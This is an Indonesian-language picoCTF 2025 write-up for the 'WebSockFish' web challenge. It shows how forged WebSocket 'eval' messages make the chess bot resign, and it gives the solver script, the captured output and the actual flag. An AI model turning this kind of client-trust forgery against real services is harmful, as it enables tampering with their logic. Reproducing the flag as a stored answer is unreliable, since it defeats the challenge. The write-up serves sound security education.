# WebSockFish

| Informasi | Detail |
| --- | --- |
| Platform / Event | picoCTF 2025 |
| Kategori | Web Exploitation |
| Tingkat Kesulitan | Medium |
| Status | Solved |

## Deskripsi

Challenge catur melawan mesin Stockfish: pemain memainkan bidak putih, mesin membalas
dengan langkah terbaiknya. Chat dengan si "ikan" menampilkan nilai evaluasi posisi.
Flag didapatkan dengan memanipulasi komunikasi WebSocket antara browser dan server.

## Informasi Awal

Instance dapat diakses melalui:

```text
http://verbal-sleep.picoctf.net:49165/
```

Halaman utama adalah papan catur interaktif (chessboard.js + stockfish.js) dengan gelembung
chat si ikan. Dari source HTML halaman utama, dua hal penting terlihat:

```javascript
var ws_address = "ws://" + location.hostname + ":" + location.port + "/ws/";
const ws = new WebSocket(ws_address);

function sendMessage(message) {
    ws.send(message);
}
```

Dan bagian yang menghitung evaluasi **di sisi klien** lalu mengirimkannya ke server:

```javascript
stockfish.onmessage = function (event) {
    if (event.data.startsWith(`info depth ${DEPTH}`)) {
        if (event.data.includes("mate")) {
            message = "mate " + parseInt(splitString[9]);
        } else {
            message = "eval " + parseInt(splitString[9]);
        }
        sendMessage(message);
    }
};
```

## Tools

- Python 3 + websocket-client (`pip install websocket-client`)
- curl (recon halaman utama)

## Analisis

### Alur data yang rapuh

Nilai evaluasi (`eval <angka>` / `mate <angka>`) **dihitung di browser pemain** oleh
Stockfish yang berjalan sebagai Web Worker, lalu dikirim ke server lewat WebSocket.
Server hanya menerima angka itu begitu saja untuk menentukan reaksi chat si ikan.

Konsekuensinya: siapa pun yang terhubung langsung ke endpoint `ws://<host>:<port>/ws/`
dapat mengirim angka evaluasi apa pun tanpa bermain catur sama sekali — kepercayaan server
pada klien adalah kerentanannya.

### Pemetaan perilaku server

Eksperimen dengan script Python (satu koneksi per pesan, karena server gemar memutus
koneksi setelah beberapa pesan):

| Pesan | Reaksi server |
| --- | --- |
| `eval 100` | respon kosong |
| `eval 500` | koneksi diputus |
| `eval -1337` | "Wow you're quite the chess shark!" |
| `eval -13337` | "Wow you're quite the chess shark!" |
| `eval -133337` | ikan menyerah dan memberikan flag |

Pola: angka **negatif** (pesan ke server: "kamu sedang kalah parah") membuat ikan makin
sombong; di ambang sekitar `-133337` rasa percaya dirinya berubah menjadi kebingungan
dan dia menyerah — lengkap dengan hadiah.

## Langkah Penyelesaian

Script solver (`source/websockfish/websockfish_solve.py`):

```python
import sys
import websocket  # pip install websocket-client

HOST = sys.argv[1] if len(sys.argv) > 1 else "verbal-sleep.picoctf.net"
PORT = sys.argv[2] if len(sys.argv) > 2 else "49165"

def send_one(msg):
    url = f"ws://{HOST}:{PORT}/ws/"
    ws = websocket.create_connection(url, timeout=10)
    print(">>>", msg)
    ws.send(msg)
    reply = ""
    try:
        while True:
            part = ws.recv()
            if not part:
                break
            reply += part
    except Exception:
        pass
    ws.close()
    print("<<<", reply)
    return reply

for msg in ["eval -1337", "eval -13337", "eval -133337", "eval -10969", "eval -2000000"]:
    r = send_one(msg)
    if "picoCTF" in r:
        print("\n[FLAG FOUND]")
        break
```

Catatan desain: setiap pesan memakai koneksi WebSocket baru karena server diketahui
memutus koneksi setelah satu-dua pesan; membuka koneksi ulang memastikan tiap pesan sampai.

Eksekusi:

```text
PS C:\Users\Malvin\Hacks\source\websockfish> python websockfish_solve.py verbal-sleep.picoctf.net 64795
>>> eval -1337
<<< Wow you're quite the chess shark!
>>> eval -13337
<<< Wow you're quite the chess shark!
>>> eval -133337
<<< Huh???? How can I be losing this badly... I resign... here's your flag: picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_232dea19}
```

## Flag

```text
picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_232dea19}
```

## Pembelajaran

- **Jangan percaya data dari klien.** Nilai evaluasi dihitung di browser; server yang
  memakainya sebagai input keputusan bisa dibohongi oleh siapa pun dengan klien WebSocket.
- Banyak challenge "chat dengan bot" sebenarnya soal protokol di baliknya — baca inline
  `<script>` di source halaman sebelum menyentuh UI.
- Eksperimen bertahap (positif → nol besar → negatif kecil → negatif besar) memetakan
  logika server tanpa perlu membaca source server.
- Koneksi WebSocket di challenge dinamis sering diputus server setelah beberapa pesan;
  pola "satu koneksi per pesan" menghindari `WebSocketConnectionClosedException`.
- Nama flag (`c1i3nt_s1d3_w3b_s0ck3t5`) merangkum vektornya: trust pada client-side
  WebSocket message.

## Referensi

- Script solver: `source/websockfish/websockfish_solve.py` di repo yang sama
- Dokumentasi websocket-client: https://websocket-client.readthedocs.io/
